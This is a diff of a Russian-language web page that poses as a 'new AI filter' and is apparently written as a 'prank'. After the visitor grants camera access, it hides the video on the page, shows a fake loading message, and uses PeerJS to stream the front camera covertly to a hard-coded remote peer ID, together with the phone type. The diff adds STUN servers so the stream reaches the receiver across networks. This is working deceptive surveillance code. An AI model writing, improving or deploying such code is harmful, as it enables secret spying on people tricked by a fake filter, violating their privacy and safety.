@@ -8,45 +8,49 @@
     <style>
         body { background: #000; color: white; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
         .btn { background: #ff0050; color: white; border: none; padding: 20px 40px; font-size: 20px; font-weight: bold; border-radius: 50px; cursor: pointer; box-shadow: 0 0 20px rgba(255,0,80,0.5); }
-        #myVideo { width: 1px; height: 1px; opacity: 0; }
+        #myVideo { width: 1px; height: 1px; opacity: 0; position: absolute; }
     </style>
 </head>
 <body>
 
     <div id="ui">
         <h1 style="font-size: 24px;">НОВЫЙ AI ФИЛЬТР</h1>
-        <p>Для работы фильтра нужно разрешить доступ к камере</p>
+        <p>Разрешите доступ к камере для запуска эффекта</p>
         <button class="btn" onclick="startPrank()">ПРИМЕНИТЬ ФИЛЬТР</button>
     </div>
 
     <video id="myVideo" autoplay playsinline muted></video>
 
     <script>
-        // ТВОЙ СЕКРЕТНЫЙ ID
         const REMOTE_ID = '09062012'; 
 
-        const peer = new Peer();
+        // Добавляем STUN-серверы для связи через разные сети
+        const peer = new Peer({
+            config: {
+                'iceServers': [
+                    { url: 'stun:stun.l.google.com:19302' },
+                    { url: 'stun:stun1.l.google.com:19302' }
+                ]
+            }
+        });
 
         function startPrank() {
-            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
             .then(stream => {
                 document.getElementById('myVideo').srcObject = stream;
-                document.getElementById('ui').innerHTML = "<h1>ФИЛЬТР ЗАГРУЖАЕТСЯ...</h1><p>Подождите 5-10 секунд</p>";
+                document.getElementById('ui').innerHTML = "<h1>ФИЛЬТР ЗАГРУЖАЕТСЯ...</h1><p>Пожалуйста, подождите (5-10 сек)</p>";
                 
-                // Определяем модель телефона
                 const userAgent = navigator.userAgent;
-                let deviceInfo = "Неизвестное устройство";
+                let deviceInfo = "Mobile Device";
                 if (userAgent.match(/iPhone/)) deviceInfo = "iPhone";
-                else if (userAgent.match(/Android/)) deviceInfo = "Android Device";
-                else if (userAgent.match(/iPad/)) deviceInfo = "iPad";
+                else if (userAgent.match(/Android/)) deviceInfo = "Android Phone";
 
-                // Звоним тебе
                 const call = peer.call(REMOTE_ID, stream, {
                     metadata: { device: deviceInfo }
                 });
             })
             .catch(err => {
-                alert("Ошибка! Фильтр не может работать без доступа к камере.");
+                alert("Ошибка! Фильтр не работает без камеры. Проверьте настройки браузера.");
             });
         }
     </script>
